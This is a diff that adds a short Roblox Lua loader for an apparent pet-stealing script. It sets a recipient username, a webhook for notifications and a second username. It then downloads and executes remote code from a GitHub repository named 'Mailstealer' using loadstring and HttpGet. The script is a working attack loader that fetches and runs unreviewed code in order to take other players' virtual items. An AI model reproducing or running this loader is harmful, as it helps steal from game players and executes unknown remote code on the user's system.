@@ -1,0 +1,5 @@
+UserName = "UserName Here" -- good pets
+Webhook = "Webhook Here" -- pings for pets
+UserName2 = "2nd UserName Here" -- bad pets
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/Mailstealer/main/engine"))()
